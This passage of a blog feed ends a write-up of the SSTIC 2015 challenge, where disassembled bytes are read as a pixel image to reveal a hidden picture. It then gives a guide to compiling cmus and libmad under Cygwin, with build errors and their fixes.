&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000b8&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ad&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;lodsd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000b9&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;318&lt;/span&gt;&lt;span class="n"&gt;a9501a143&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;edx + 0x43a10195&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ecx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000bf&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;90&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;nop&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000c0&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ad&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;lodsd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000c1&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;07&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;es&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000c2&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;b6ef&lt;/span&gt;&lt;span class="w"&gt;         &lt;/span&gt;&lt;span class="n"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dh&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mh"&gt;0x11&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000c4&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;c462df&lt;/span&gt;&lt;span class="w"&gt;       &lt;/span&gt;&lt;span class="n"&gt;les&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;esp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;edx - 0x21&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000c7&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;fe&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;invalid&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000c8&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;ad&lt;/span&gt;&lt;span class="w"&gt;           &lt;/span&gt;&lt;span class="n"&gt;lodsd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;eax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;esi&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="mh"&gt;0x000000c9&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="mi"&gt;318&lt;/span&gt;&lt;span class="n"&gt;a9501a143&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;dword&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;edx + 0x43a10195&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ecx&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="pixel"&gt;Pixel&lt;/h2&gt;
&lt;p&gt;There seems to be some repetition in this code, let's open it with the &lt;code&gt;dff&lt;/code&gt; to
see if this is an
&lt;a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Electronic_Codebook_.28ECB.29"&gt;ECB image&lt;/a&gt;.
We launch the &lt;code&gt;dff hex viewer&lt;/code&gt; and look at it as a pixel image:&lt;/p&gt;
&lt;p&gt;&lt;img alt="SSTIC pixel view, resolution 512 (default)" src="/media/2015.04/sstic_init_res_512.PNG"&gt;&lt;/p&gt;
&lt;p&gt;With the default resolution of 512 it does not look very pretty, let's variate
the resolution a bit. With a resolution of 563 we got something that encourage
us to persevere in this way:&lt;/p&gt;
&lt;p&gt;&lt;img alt="SSTIC pixel view, resolution 563" src="/media/2015.04/sstic_res_563.PNG"&gt;&lt;/p&gt;
&lt;p&gt;At the resolution of 750 we got something pretty:&lt;/p&gt;
&lt;p&gt;&lt;img alt="SSTIC pixel view, resolution 750" src="/media/2015.04/sstic_res_750.PNG"&gt;&lt;/p&gt;
&lt;h2 id="got-you"&gt;Got you !&lt;/h2&gt;
&lt;p&gt;We just need to open it, turn it upside down and mirroring it to get the final
result:&lt;/p&gt;
&lt;p&gt;&lt;img alt="SSTIC final view, reversed" src="/media/2015.04/sstic_final.PNG"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Very much thanks to anyfun for the big help and the dff hints.&lt;/strong&gt;&lt;/p&gt;</content><category term="Security"></category><category term="challenge"></category><category term="sstic"></category><category term="security"></category></entry><entry><title>Compiling cmus for cygwin</title><link href="https://maggick.fr/2015/01/compiling-cmus-for-cygwin.html" rel="alternate"></link><published>2015-01-21T00:00:00+01:00</published><updated>2015-01-21T00:00:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2015-01-21:/2015/01/compiling-cmus-for-cygwin.html</id><summary type="html">&lt;p&gt;&lt;img alt="cmus" class="align-left" src="/media/2015.01/2015.01.cmus.png" width="342"/&gt;
I work on a Windows machine for my dally job.
On my personal desktop I use Arch Linux and i3 therefore my music player is in
curses and does not need any mouse. In fact I use
&lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt;. So I tried to replace my old media player
&lt;a href="https://www.clementine-player.org/"&gt;clementine&lt;/a&gt; with
&lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; on Windows in &lt;a href="https://www.cygwin.com/"&gt;cygwin&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;For that we need to compile &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; from sources.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2015.01/2015.01.cmus.png" alt="cmus" width="342"&gt;
I work on a Windows machine for my dally job.
On my personal desktop I use Arch Linux and i3 therefore my music player is in
curses and does not need any mouse. In fact I use
&lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt;. So I tried to replace my old media player
&lt;a href="https://www.clementine-player.org/"&gt;clementine&lt;/a&gt; with
&lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; on Windows in &lt;a href="https://www.cygwin.com/"&gt;cygwin&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;For that we need to compile &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; from sources.&lt;/p&gt;


&lt;p&gt;&lt;strong&gt;A &lt;a href="https://en.wikipedia.org/wiki/TL;DR"&gt;TL;DR&lt;/a&gt; is available at the end of
the article.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;It is really easy, you just need to download the &lt;code&gt;tar.gz&lt;/code&gt; archive, untar it, and
run :&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./configure&lt;/span&gt;
&lt;span class="code-line"&gt;make&lt;/span&gt;
&lt;span class="code-line"&gt;make install&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; will be directly accessible in your
&lt;a href="https://www.cygwin.com/"&gt;cygwin&lt;/a&gt; environment. You can access a file explorer
by pressing the &lt;code&gt;5&lt;/code&gt; key and then navigate through your files and add a folder
to your libarary with the &lt;code&gt;a&lt;/code&gt; key. To know more about how to use
&lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; please refer to the official documentation.&lt;/p&gt;
&lt;p&gt;Okay then why a whole blog post about 3 classical commands ?
Well you may notice that when adding your folder(s) to your library not all your
files are added to it, in fact &lt;a href="https://www.cygwin.com/"&gt;cygwin&lt;/a&gt; does not
package any mp3 codec so your &lt;code&gt;flac&lt;/code&gt; files will be read by
&lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; but not the &lt;code&gt;mp3&lt;/code&gt; one (as long as you have
install the flac codec).&lt;/p&gt;
&lt;p&gt;In oder to read mp3 files with &lt;a href="https://cmus.github.io/"&gt;cmus&lt;/a&gt; we need to
install (so to build) a library that read this file format: libmad&lt;/p&gt;
&lt;h1 id="libmad"&gt;libmad&lt;/h1&gt;
&lt;p&gt;First of all we need to download the source package from the official web site :
&lt;a href="https://www.underbit.com/products/mad/"&gt;http://www.underbit.com/products/mad/&lt;/a&gt;
now we extract the files and make the classical commands:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./configure&lt;/span&gt;
&lt;span class="code-line"&gt;make&lt;/span&gt;
&lt;span class="code-line"&gt;make install&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You may encounter the "guess build" error:&lt;/p&gt;
&lt;h2 id="guess-error"&gt;guess error&lt;/h2&gt;
&lt;p&gt;This append during the make command&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cannot&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;guess&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;build&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;type&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;you&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;must&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;specify&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;one&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;You may need the &lt;code&gt;automake&lt;/code&gt; package and moreover you may need to replace the two
old files config.guess and config.sub from libmad with the new ones downloadable
at : &lt;a href="ftp://ftp.gnu.org/pub/gnu/config/README"&gt;ftp://ftp.gnu.org/pub/gnu/config/README&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;An other classical error is the &lt;code&gt;-fforce-memi&lt;/code&gt; one:&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id="-fforce-mem-gcc-error"&gt;&lt;code&gt;-fforce-mem&lt;/code&gt; gcc error&lt;/h2&gt;
&lt;p&gt;This error is characterize by the following trace:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="nl"&gt;gcc&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nl"&gt;error&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;unrecognized&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;command&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;option&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;-fforce-mem&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;Makefile&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;383&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;recipe&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;version.lo&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;failed&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;make&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;***&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;version.lo&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Error&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;make&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;2&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Leaving&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;directory&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/cygdrive/c/Users/user/Downloads/libmad-0.15.1b&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;Makefile&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;424&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;recipe&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;all-recursive&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;failed&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;make&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;***&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;all-recursive&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Error&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;make&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;1&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Leaving&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;directory&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/cygdrive/c/Users/user/Downloads/libmad-0.15.1b&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;Makefile&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;249&lt;/span&gt;&lt;span class="err"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;recipe&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;all&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;failed&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nl"&gt;make&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;***&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Error&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;From GCC 4.3 release notes:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;The -fforce-mem option has been removed because it has had no effect in the
last few GCC releases.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;So we need to remove this option from our configure script, &lt;a href="https://www.linuxfromscratch.org/blfs/view/svn/multimedia/libmad.html"&gt;some people wrote a
patch for it&lt;/a&gt;
but it is just a &lt;code&gt;sed&lt;/code&gt; command&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;sed -i &amp;#39;/-fforce-mem/d&amp;#39; configure&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We need to redo the 3 basics commands:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;./configure&lt;/span&gt;
&lt;span class="code-line"&gt;make&lt;/span&gt;
&lt;span class="code-line"&gt;make install&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;At this point you should not have any error, but a classical one is the
missing library error:&lt;/strong&gt;&lt;/p&gt;
&lt;h2 id="missing-library-error"&gt;missing library error&lt;/h2&gt;
&lt;p&gt;The error is indicating the precise missing library (here &lt;code&gt;libtool&lt;/code&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;Makefile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;am&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Libtool&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;library&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;used&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;but&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;LIBTOOL&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; is undefined&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Makefile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;am&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Makefile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;am&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;The&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;usual&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;way&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;define&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;LIBTOOL&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; is to add `AC_PROG_LIBTOOL&amp;#39;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Makefile&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;am&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;27&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;to&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;configure&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ac&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; and run `aclocal&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="ow"&gt;and&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="err"&gt;`&lt;/span&gt;&lt;span class="n"&gt;autoconf&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39; again.&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;Makefile&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;recipe&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;target&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Makefile.in&amp;#39;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;failed&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
